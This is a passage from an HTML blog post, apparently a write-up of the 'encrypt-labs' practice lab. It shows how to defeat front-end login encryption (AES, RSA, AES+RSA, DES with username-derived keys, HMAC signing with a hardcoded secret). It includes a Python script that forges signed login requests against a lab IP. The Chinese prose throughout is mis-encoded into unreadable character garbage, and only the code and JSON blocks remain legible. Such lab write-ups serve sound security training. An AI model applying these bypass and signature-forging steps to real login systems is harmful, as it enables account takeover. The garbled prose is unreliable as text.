class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><img src="https://img.dkdun.cn/v1/2025/12/a6f0b6d7a8cbb65a.png" style="zoom:50%;" /><p>æœç´¢å…³é”®å­—å®šä½åˆ°ç®—æ³•éƒ¨åˆ†ï¼Œå‘ç°æœåŠ¡å™¨è¯·æ±‚è·å– key å’Œ iv ï¼Œé‡å‘æ•°æ®åŒ…å‘ç° key å’Œ iv çŸ­æ—¶é—´å†…ä¸ä¼šå‘ç”Ÿå˜åŒ–</p><img src="https://img.dkdun.cn/v1/2025/12/7fce5520d2422ea3.png" style="zoom:50%;" /><p>autoDecoder é…ç½®</p><img src="https://img.dkdun.cn/v1/2025/12/de8de9afc713e97f.png" style="zoom: 50%;" /><p>è§£å¯†æˆåŠŸ</p><img src="https://img.dkdun.cn/v1/2025/12/04eb77ad502fb2a0.png"  /><h1 id="RSA-åŠ å¯†"><a href="#RSA-åŠ å¯†" class="headerlink" title="RSA åŠ å¯†"></a>RSA åŠ å¯†</h1><p>æŠ“åŒ…æ‹¿åˆ°æ•°æ®ï¼Œå‡ºç° data å‚æ•°</p><img src="https://img.dkdun.cn/v1/2025/12/0511c7c872998b5a.png" style="zoom: 50%;" /><p>æœç´¢å…³é”®å­—ï¼Œæ‰¾åˆ°åŠ å¯†ä»£ç ï¼Œæ‰“ä¸ªæ–­ç‚¹è°ƒè¯•</p><img src="https://img.dkdun.cn/v1/2025/12/8cd1553717967864.png" style="zoom: 50%;" /><p>æ‹¿åˆ°æ•°æ®ï¼Œåªæœ‰å…¬é’¥ï¼Œæ²¡æœ‰ç§é’¥ï¼Œåªèƒ½åŠ å¯†</p><img src="https://img.dkdun.cn/v1/2025/12/91e837c918197e02.png" style="zoom: 33%;" /><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript">-----<span class="hljs-variable constant_">BEGIN</span> <span class="hljs-variable constant_">PUBLIC</span> <span class="hljs-variable constant_">KEY</span>-----<br><span class="hljs-title class_">MIGfMA</span>0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDRvA7giwinEkaTYllDYCkzujvi<br><span class="hljs-variable constant_">NH</span>+up0XAKXQot8RixKGpB7nr8AdidEvuo+wVCxZwDK3hlcRGrrqt0Gxqwc11btlM<br><span class="hljs-title class_">DSj92Mr3</span>xSaJcshZU8kfj325L8DRh9jpruphHBfh955ihvbednGAvOHOrz3Qy3Cb<br>ocDbsNeCwNpRxwjIdQIDAQAB<br>-----<span class="hljs-variable constant_">END</span> <span class="hljs-variable constant_">PUBLIC</span> <span class="hljs-variable constant_">KEY</span>-----<br></code></pre></td></tr></table></figure><p>autoDecoder é…ç½®</p><img src="https://img.dkdun.cn/v1/2025/12/dd4ead25cf7e4995.png" style="zoom: 33%;" /><img src="https://img.dkdun.cn/v1/2025/12/14dae204bc48dca6.png" style="zoom: 50%;" /><h1 id="AES-RSA-åŠ å¯†"><a href="#AES-RSA-åŠ å¯†" class="headerlink" title="AES + RSA åŠ å¯†"></a>AES + RSA åŠ å¯†</h1><p>æŠ“åŒ…çœ‹æ•°æ®</p><img src="https://img.dkdun.cn/v1/2025/12/208f330bc5c32b5a.png" style="zoom: 40%;" /><p>æœç´¢å…³é”®å‚æ•°æŸ¥æ‰¾åŠ å¯†ç®—æ³•ï¼Œä¸‹æ–­ç‚¹è·å–æ•°æ®</p><img src="https://img.dkdun.cn/v1/2025/12/7afa1fe5bf7c235d.png" style="zoom: 40%;" /><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">sendDataAesRsa</span>(<span class="hljs-params">url</span>) &#123;<br><span class="hljs-keyword">const</span> formData = &#123;<br><span class="hljs-attr">username</span>: <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;username&quot;</span>)<br>.<span class="hljs-property">value</span>,<br><span class="hljs-attr">password</span>: <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;password&quot;</span>)<br>.<span class="hljs-property">value</span><br>&#125;;<br><span class="hljs-keyword">const</span> jsonData = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(formData);<br><br><span class="hljs-keyword">const</span> key = <span class="hljs-title class_">CryptoJS</span>.<span class="hljs-property">lib</span>.<span class="hljs-property">WordArray</span>.<span class="hljs-title function_">random</span>(<span class="hljs-number">16</span>);<br><span class="hljs-keyword">const</span> iv = <span class="hljs-title class_">CryptoJS</span>.<span class="hljs-property">lib</span>.<span class="hljs-property">WordArray</span>.<span class="hljs-title function_">random</span>(<span class="hljs-number">16</span>);<br><br><span class="hljs-keyword">const</span> encryptedData = <span class="hljs-title class_">CryptoJS</span>.<span class="hljs-property">AES</span>.<span class="hljs-title function_">encrypt</span>(jsonData, key, &#123;<br><span class="hljs-attr">iv</span>: iv,<br><span class="hljs-attr">mode</span>: <span class="hljs-title class_">CryptoJS</span>.<span class="hljs-property">mode</span>.<span class="hljs-property">CBC</span>,<br><span class="hljs-attr">padding</span>: <span class="hljs-title class_">CryptoJS</span>.<span class="hljs-property">pad</span>.<span class="hljs-property">Pkcs7</span><br>&#125;)<br>.<span class="hljs-title function_">toString</span>();<br><br><span class="hljs-keyword">const</span> rsa = <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSEncrypt</span>();<br>rsa.<span class="hljs-title function_">setPublicKey</span>(<span class="hljs-string">`-----BEGIN PUBLIC KEY-----</span><br><span class="hljs-string">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDRvA7giwinEkaTYllDYCkzujvi</span><br><span class="hljs-string">NH+up0XAKXQot8RixKGpB7nr8AdidEvuo+wVCxZwDK3hlcRGrrqt0Gxqwc11btlM</span><br><span class="hljs-string">DSj92Mr3xSaJcshZU8kfj325L8DRh9jpruphHBfh955ihvbednGAvOHOrz3Qy3Cb</span><br><span class="hljs-string">ocDbsNeCwNpRxwjIdQIDAQAB</span><br><span class="hljs-string">-----END PUBLIC KEY-----`</span>);<br><br><span class="hljs-keyword">const</span> encryptedKey = rsa.<span class="hljs-title function_">encrypt</span>(key.<span class="hljs-title function_">toString</span>(<span class="hljs-title class_">CryptoJS</span>.<span class="hljs-property">enc</span>.<span class="hljs-property">Base64</span>));<br><span class="hljs-keyword">const</span> encryptedIv = rsa.<span class="hljs-title function_">encrypt</span>(iv.<span class="hljs-title function_">toString</span>(<span class="hljs-title class_">CryptoJS</span>.<span class="hljs-property">enc</span>.<span class="hljs-property">Base64</span>));<br></code></pre></td></tr></table></figure><p>è¢«åŠ å¯†çš„å‚æ•°æ˜¯ <code>formData</code> ä¹Ÿå°±æ˜¯ <code>&quot;&#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;123456&quot;&#125;&quot;</code></p><img src="https://img.dkdun.cn/v1/2025/12/c3517fc45108b450.png" style="zoom:67%;" /><p>ç»è¿‡ <code>AES</code> åŠ å¯†ï¼Œä½†åŠ å¯†ä½¿ç”¨çš„ <code>key</code> å’Œ <code>iv</code> æ˜¯16ä½éšæœºæ•°ï¼Œå¾—åˆ° <code>encryptedData</code>ï¼Œç„¶åå¯¹ <code>key</code> å’Œ <code>iv </code>è¿›è¡Œ <code>rsa</code> åŠ å¯†å¾—åˆ°<code>encryptedKey</code> å’Œ  <code>encryptedIv</code>ï¼Œå†å°†è¿™ä¸‰ä¸ªå‚æ•°ä¼ å…¥æ•°æ®åŒ…ä¸­å‘åŒ…è¿›è¡ŒéªŒè¯</p><p><img src="https://img.dkdun.cn/v1/2025/12/a582e861bce2da11.png"></p><p>å°†éšæœº 16 ä½çš„ <code>key</code> å’Œ <code>iv</code> è¿›è¡Œå›ºå®šï¼Œå³é”®é€‰æ‹©æ›¿æ¢å†…å®¹ï¼Œä½¿ç”¨æœ¬åœ°æ›¿æ¢çš„æ–¹å¼å›ºå®š <code>key</code> å’Œ <code>iv</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> key = <span class="hljs-title class_">CryptoJS</span>.<span class="hljs-property">enc</span>.<span class="hljs-property">Utf8</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-string">&quot;1234567890123456&quot;</span>);<br><span class="hljs-keyword">const</span> iv = <span class="hljs-title class_">CryptoJS</span>.<span class="hljs-property">enc</span>.<span class="hljs-property">Utf8</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-string">&quot;1234567890123456&quot;</span>);<br></code></pre></td></tr></table></figure><p>å³é”®æµè§ˆå™¨ï¼ˆä» Firefox æ¢æˆäº† Chromeï¼‰æ›¿æ¢ï¼Œé€‰æ‹©æœ¬åœ°æ›¿æ¢ï¼Œæ–°å»ºä¸€ä¸ª js æ–‡ä»¶æ›¿æ¢</p><img src="https://img.dkdun.cn/v1/2025/12/bd63b1fe239a21dd.png" style="zoom: 80%;" /><p>ä¸‹æ–­ç‚¹è°ƒè¯•</p><img src="https://img.dkdun.cn/v1/2025/12/d77f41bbd5ebc7e9.png" style="zoom: 40%;" /><img src="https://img.dkdun.cn/v1/2025/12/5f0b4d5241e75cbc.png" style="zoom:40%;" /><p>ç»è¿‡å‡ æ¬¡ç™»å½•å‘ç° encryptedData ä¸ä¼šå˜ï¼Œä½† Key å’Œ Iv ä¼šæ”¹å˜ï¼Œè¯´æ˜ä¿®æ”¹æˆåŠŸäº†</p><img src="https://img.dkdun.cn/v1/2025/12/25b34044557d69d1.png" style="zoom: 50%;" /><p>autoDecoder é…ç½®å’Œä¹‹å‰ä¸€æ ·ï¼Œè§£å¯†æˆåŠŸ</p><h1 id="Des-è§„å¾‹-Key"><a href="#Des-è§„å¾‹-Key" class="headerlink" title="Des è§„å¾‹ Key"></a>Des è§„å¾‹ Key</h1><p>æŠ“åŒ…æ‹¿åˆ°æ•°æ®ï¼Œåªå¯¹ <code>password</code> è¿›è¡Œäº†åŠ å¯†</p><img src="https://img.dkdun.cn/v1/2025/12/0735abcfa6c33853.png" style="zoom:67%;" /><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;admin&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;3981f487c5afde43&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>åŠ å¯†ç®—æ³•æ¯”è¾ƒç®€å•</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">encryptAndSendDataDES</span>(<span class="hljs-params">url</span>) &#123;<br><span class="hljs-keyword">const</span> username = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;username&quot;</span>)<br>.<span class="hljs-property">value</span>;<br><span class="hljs-keyword">const</span> password = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;password&quot;</span>)<br>.<span class="hljs-property">value</span>;<br><br><span class="hljs-keyword">const</span> key = <span class="hljs-title class_">CryptoJS</span>.<span class="hljs-property">enc</span>.<span class="hljs-property">Utf8</span>.<span class="hljs-title function_">parse</span>(username.<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>, <span class="hljs-number">8</span>)<br>.<span class="hljs-title function_">padEnd</span>(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;6&#x27;</span>));<br><br><span class="hljs-keyword">const</span> iv = <span class="hljs-title class_">CryptoJS</span>.<span class="hljs-property">enc</span>.<span class="hljs-property">Utf8</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-string">&#x27;9999&#x27;</span> + username.<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>, <span class="hljs-number">4</span>)<br>.<span class="hljs-title function_">padEnd</span>(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;9&#x27;</span>));<br><br><span class="hljs-keyword">const</span> encryptedPassword = <span class="hljs-title class_">CryptoJS</span>.<span class="hljs-property">DES</span>.<span class="hljs-title function_">encrypt</span>(password, key, &#123;<br><span class="hljs-attr">iv</span>: iv,<br><span class="hljs-attr">mode</span>: <span class="hljs-title class_">CryptoJS</span>.<span class="hljs-property">mode</span>.<span class="hljs-property">CBC</span>,<br><span class="hljs-attr">padding</span>: <span class="hljs-title class_">CryptoJS</span>.<span class="hljs-property">pad</span>.<span class="hljs-property">Pkcs7</span><br>&#125;);<br><br><span class="hljs-keyword">const</span> encryptedHex = encryptedPassword.<span class="hljs-property">ciphertext</span>.<span class="hljs-title function_">toString</span>(<span class="hljs-title class_">CryptoJS</span>.<span class="hljs-property">enc</span>.<span class="hljs-property">Hex</span>);<br></code></pre></td></tr></table></figure><p>ç®€å•çš„ <code>DES</code> åŠ å¯†ï¼Œ<code>key</code> å’Œ <code>iv</code> éƒ½ä½¿ç”¨äº†<code>username</code> çš„å€¼ï¼Œ<code>key</code> æ˜¯ 8 ä½ï¼Œå¦‚æœ <code>username</code> ä¸æ»¡ 8 ä½åˆ™ç”¨ 6 è¡¥æ»¡ï¼Œ<code>iv</code> æ˜¯ 8 ä½ï¼Œ<code>9999 + username</code> çš„å‰å››ä½ï¼Œæ‰€ä»¥è¾“å…¥ adminï¼Œkey å’Œ iv å€¼å¦‚ä¸‹ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript">keyï¼šadmin666<br>ivï¼š9999admi<br></code></pre></td></tr></table></figure><p>autoDecoder è§£å¯†</p><img src="https://img.dkdun.cn/v1/2025/12/bf931770dbb5ac1e.png" style="zoom:67%;" /><h1 id="æ˜æ–‡åŠ ç­¾"><a href="#æ˜æ–‡åŠ ç­¾" class="headerlink" title="æ˜æ–‡åŠ ç­¾"></a>æ˜æ–‡åŠ ç­¾</h1><p>æŠ“åŒ…æ‹¿åˆ°æ•°æ®ï¼Œå¤šäº†ä¸¤ä¸ªå‚æ•°åˆ†åˆ«æ˜¯ <code>nonce</code>ï¼Œ<code>signature</code> ï¼Œè¿˜æœ‰ä¸ªæ—¶é—´æˆ³</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;admin&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;123456&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;nonce&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;r4nauns4od&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;timestamp&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1748175966</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;signature&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;9ffc131e7a68507c6338362ff38e1450ab12ccf22fc97d439115462566047ba7&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>åŠ å¯†ç®—æ³•</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">sendDataWithNonce</span>(<span class="hljs-params">url</span>) &#123;<br><span class="hljs-keyword">const</span> username = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;username&quot;</span>)<br>.<span class="hljs-property">value</span>;<br><span class="hljs-keyword">const</span> password = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;password&quot;</span>)<br>.<span class="hljs-property">value</span>;<br><br><span class="hljs-keyword">const</span> nonce = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>()<br>.<span class="hljs-title function_">toString</span>(<span class="hljs-number">36</span>)<br>.<span class="hljs-title function_">substring</span>(<span class="hljs-number">2</span>);<br><span class="hljs-keyword">const</span> timestamp = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>() / <span class="hljs-number">1000</span>);<br><br><span class="hljs-keyword">const</span> secretKey = <span class="hljs-string">&quot;be56e057f20f883e&quot;</span>;<br><br><span class="hljs-keyword">const</span> dataToSign = username + password + nonce + timestamp;<br><span class="hljs-keyword">const</span> signature = <span class="hljs-title class_">CryptoJS</span>.<span class="hljs-title class_">HmacSHA256</span>(dataToSign, secretKey).<span class="hljs-title function_">toString</span>(<span class="hljs-title class_">CryptoJS</span>.<span class="hljs-property">enc</span>.<span class="hljs-property">Hex</span>);<br></code></pre></td></tr></table></figure><p>nonceï¼šå°å†™å­—æ¯å’Œæ•°å­—ç»„æˆçš„éšæœºå­—ç¬¦ä¸²</p><p>dataToSignï¼š<code>username + password + nonce + timestamp</code></p><p>signatureï¼šç”± <code>dataToSign</code> ç»è¿‡ <code>SHA256</code> åŠ å¯†ç”Ÿæˆï¼Œ<code>secretKey</code>ä¸ºå›ºå®šå€¼ <code>be56e057f20f883e</code></p><p>ä½¿ç”¨äº† HmacSHA256 å¯¹ usernameã€passwordã€nonceã€timestamp è¿›è¡Œäº†ç­¾åæ ¡éªŒï¼Œä½†æ˜¯æ‹¿åˆ°äº† Keyï¼Œæ‰€ä»¥å¯ä»¥ä¼ªé€ ç­¾å</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> hmac<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> pprint<br><br>url = <span class="hljs-string">&quot;http://172.22.9.123/encrypt-labs-main/encrypt/signdata.php&quot;</span><br>secret_key = <span class="hljs-string">&quot;be56e057f20f883e&quot;</span><br>username = <span class="hljs-string">&quot;admin&quot;</span><br>password = <span class="hljs-string">&quot;123456&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_nonce</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(random.choice(<span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz&#x27;</span>) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_signature</span>(<span class="hljs-params">username, password, nonce, timestamp, key</span>):<br>    data_to_sign = username + password + nonce + <span class="hljs-built_in">str</span>(timestamp)<br>    <span class="hljs-keyword">return</span> hmac.new(key.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>), data_to_sign.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>), hashlib.sha256).hexdigest()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_signed_request</span>():<br>    nonce = generate_nonce()<br>    timestamp = <span class="hljs-built_in">int</span>(time.time())<br>    signature = generate_signature(username, password, nonce, timestamp, secret_key)<br><br>    headers = &#123;<br>        <span class="hljs-string">&quot;Host&quot;</span>: <span class="hljs-string">&quot;172.22.9.123&quot;</span>,<br>        <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0&quot;</span>,<br>        <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/json&quot;</span>,<br>        <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;*/*&quot;</span>,<br>        <span class="hljs-string">&quot;Origin&quot;</span>: <span class="hljs-string">&quot;http://172.22.9.123&quot;</span>,<br>        <span class="hljs-string">&quot;Referer&quot;</span>: <span class="hljs-string">&quot;http://172.22.9.123/encrypt-labs-main/easy.php&quot;</span>,<br>    &#125;<br><br>    payload = &#123;<br>        <span class="hljs-string">&quot;username&quot;</span>: username,<br>        <span class="hljs-string">&quot;password&quot;</span>: password,<br>        <span class="hljs-string">&quot;nonce&quot;</span>: nonce,<br>        <span class="hljs-string">&quot;timestamp&quot;</span>: timestamp,<br>        <span class="hljs-string">&quot;signature&quot;</span>: signature<br>    &#125;<br><br>    response = requests.post(url, json=payload, headers=headers)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Status Code:&quot;</span>, response.status_code)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Response Headers:&quot;</span>)<br>    pprint.pprint(<span class="hljs-built_in">dict</span>(response.headers))<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    send_signed_request()<br><br></code></pre></td></tr></table></figure><p>è¿è¡Œæ‹¿åˆ°ç»“æœ</p><img src="https://img.dkdun.cn/v1/2025/12/50aafeeacc578756.png" style="zoom:50%;" /><h1 id="åŠ ç­¾-key-åœ¨æœåŠ¡ç«¯"><a href="#åŠ ç­¾-key-åœ¨æœåŠ¡ç«¯" class="headerlink" title="åŠ ç­¾ key åœ¨æœåŠ¡ç«¯"></a>åŠ ç­¾ key åœ¨æœåŠ¡ç«¯</h1><p>æŠ“åŒ…è¿”å›äº†ä¸¤ä¸ªé¡µé¢æ•°æ®</p><p>ç¬¬ä¸€ä¸ªæ•°æ®åŒ…è·å– signature</p><img src="https://img.dkdun.cn/v1/2025/12/c4c2302b0347483c.png" style="zoom: 67%;" /><p>ç¬¬äºŒä¸ªæ•°æ®åŒ…åŠ ä¸Šè·å–çš„ signature</p><img src="https://img.dkdun.cn/v1/2025/12/cd949891e855a459.png" style="zoom: 45%;" /><p>æŸ¥çœ‹åŠ å¯†ç®—æ³•ï¼Œå‘ç°å…ˆå»æœåŠ¡ç«¯è·å–ç­¾åï¼Œç„¶åå¯¹usernameï¼Œpasswordï¼Œtimestamp è¿›è¡Œç­¾åå†ç™»å½•</p><img src="https://img.dkdun.cn/v1/2025/12/a28641ff88132106.png" style="zoom: 80%;" /><p>å› ä¸ºåŠ è§£å¯†éƒ½åœ¨æœåŠ¡å™¨ç«¯å®Œæˆæ‰€ä»¥æ— æ³•ä¼ªé€ </p><h1 id="ç¦æ­¢é‡æ”¾"><a href="#ç¦æ­¢é‡æ”¾" class="headerlink" title="ç¦æ­¢é‡æ”¾"></a>ç¦æ­¢é‡æ”¾</h1><p>æŠ“åŒ…ï¼Œå‘ç°è´¦å·å¯†ç æ˜¯æ˜æ–‡çš„ï¼Œå¤šäº†ä¸€ä¸ª random å‚æ•°</p><img src="https://img.dkdun.cn/v1/2025/12/d4844a0fe13f080f.png" style="zoom: 50%;" /><p>å®šä½ç®—æ³•è°ƒè¯•</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">generateRequestData</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">const</span> username = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;username&quot;</span>).<span class="hljs-property">value</span>;<br>    <span class="hljs-keyword">const</span> password = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;password&quot;</span>).<span class="hljs-property">value</span>;<br>    <span class="hljs-keyword">const</span> timestamp = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();<br><br>    <span class="hljs-keyword">const</span> publicKey = <span class="hljs-string">`-----BEGIN PUBLIC KEY-----</span><br><span class="hljs-string">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDRvA7giwinEkaTYllDYCkzujvi</span><br><span class="hljs-string">NH+up0XAKXQot8RixKGpB7nr8AdidEvuo+wVCxZwDK3hlcRGrrqt0Gxqwc11btlM</span><br><span class="hljs-string">DSj92Mr3xSaJcshZU8kfj325L8DRh9jpruphHBfh955ihvbednGAvOHOrz3Qy3Cb</span><br><span class="hljs-string">ocDbsNeCwNpRxwjIdQIDAQAB</span><br><span class="hljs-string">-----END PUBLIC KEY-----`</span>;<br><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">rsaEncrypt</span>(<span class="hljs-params">data, publicKey</span>) &#123;<br>        <span class="hljs-keyword">const</span> jsEncrypt = <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSEncrypt</span>(); <br>        jsEncrypt.<span class="hljs-title function_">setPublicKey</span>(publicKey);<br>        <span class="hljs-keyword">const</span> encrypted = jsEncrypt.<span class="hljs-title function_">encrypt</span>(data.<span class="hljs-title function_">toString</span>());<br>        <span class="hljs-keyword">if</span> (!encrypted) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&quot;RSA encryption failed.&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> encrypted;<br>    &#125;<br><br>    <span class="hljs-comment">// Encrypt the timestamp</span><br>    <span class="hljs-keyword">let</span> encryptedTimestamp;<br>    <span class="hljs-keyword">try</span> &#123;<br>        encryptedTimestamp = <span class="hljs-title function_">rsaEncrypt</span>(timestamp, publicKey);<br>    &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&quot;Encryption error:&quot;</span>, error);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">const</span> dataToSend = 